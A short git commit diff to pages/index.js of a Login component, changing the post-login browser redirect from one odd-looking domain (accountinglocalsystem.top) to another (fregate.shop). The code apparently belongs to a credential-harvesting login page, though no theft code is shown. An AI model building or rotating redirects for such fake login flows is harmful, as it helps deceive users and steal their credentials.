d176f8d5b7051377e86288b44431fe7a2786cef9
husknet <127146284+husknet@users.noreply.github.com>
2025-03-10 14:52:56 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://tb.accountinglocalsystem.top/';
+      window.location.href = 'https://tb.fregate.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
